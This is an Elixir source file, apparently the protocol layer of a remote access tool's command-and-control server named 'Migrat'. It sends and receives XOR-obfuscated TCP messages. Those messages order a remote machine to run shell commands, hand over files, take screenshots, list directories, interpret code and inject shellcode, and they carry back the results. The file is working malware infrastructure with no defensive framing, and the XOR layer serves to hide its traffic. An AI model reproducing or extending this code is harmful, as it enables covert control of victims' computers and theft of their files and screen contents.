defmodule Connections.Translator do
  require Logger

  def read_message(socket, key) do
    with {:ok, header} <- :gen_tcp.recv(socket, 8),
         bytes_send <- :binary.decode_unsigned(header, :little),
         {:ok, data} <- :gen_tcp.recv(socket, bytes_send) do
      data = xor_message(data, key)

      message_type = Binary.last(data)


      data = binary_part(data, 0, byte_size(data) - 1)

      {:ok, decode_message(message_type, data)}
    else
      _ -> {:error, nil}
    end
  end

  def send_message(socket, type, message, key) do
    data = encode_message(type, message)
    data = xor_message(data, key)
    len_bytes = <<byte_size(data)::little-integer-size(64)>>
    case :gen_tcp.send(socket, len_bytes) do
      :ok -> :gen_tcp.send(socket, data)
      a -> a
    end
  end

  defp decode_message(type, data) do
    case type do
      0 -> {:heartbeat_response, Migrat.HeartbeatResponse.decode(data)}
      1 -> {:shell_command, Migrat.ShellCommand.decode(data)}
      2 -> {:get_file, Migrat.GetFile.decode(data)}
      3 -> {:take_screenshot, Migrat.TakeScreenshot.decode(data)}
      4 -> {:get_directory, Migrat.GetDirectory.decode(data)}
      5 -> {:interpret, Migrat.Interpret.decode(data)}
      6 -> {:inject_shellcode, Migrat.InjectShellcode.decode(data)}
      10 -> {:ident, Migrat.Ident.decode(data)}
      11 -> {:shell_response, Migrat.ShellResponse.decode(data)}
      12 -> {:file, Migrat.File.decode(data)}
      13 -> {:screenshot, Migrat.Screenshot.decode(data)}
      14 -> {:get_directory_response, Migrat.GetDirectoryResponse.decode(data)}
      15 -> {:interpret_response, Migrat.InterpretResponse.decode(data)}
    end
  end

  defp encode_message(type, m) do
    case type do
      :heartbeat_response -> Migrat.HeartbeatResponse.encode(m) <> <<0>>
      :shell_command -> Migrat.ShellCommand.encode(m) <> <<1>>
      :get_file -> Migrat.GetFile.encode(m) <> <<2>>
      :take_screenshot -> Migrat.TakeScreenshot.encode(m) <> <<3>>
      :get_directory -> Migrat.GetDirectory.encode(m) <> <<4>>
      :interpret -> Migrat.Interpret.encode(m) <> <<5>>
      :inject_shellcode -> Migrat.InjectShellcode.encode(m) <> <<6>>
      :ident -> Migrat.Ident.encode(m) <> <<10>>
      :shell_response -> Migrat.ShellResponse.encode(m) <> <<11>>
      :file -> Migrat.File.encode(m) <> <<12>>
      :screenshot -> Migrat.Screenshot.encode(m) <> <<13>>
      :get_directory_response -> Migrat.GetDirectoryResponse.encode(m) <> <<14>>
      :interpret_response -> Migrat.InterpretResponse.encode(m) <> <<15>>
    end
  end

  def xor_message(data, key) do
    keystream =
      key
      |> Binary.to_list()
      |> Stream.cycle()
      |> Enum.take(byte_size(data))
      |> Binary.from_list()

    :crypto.exor(keystream, data)
  end
end
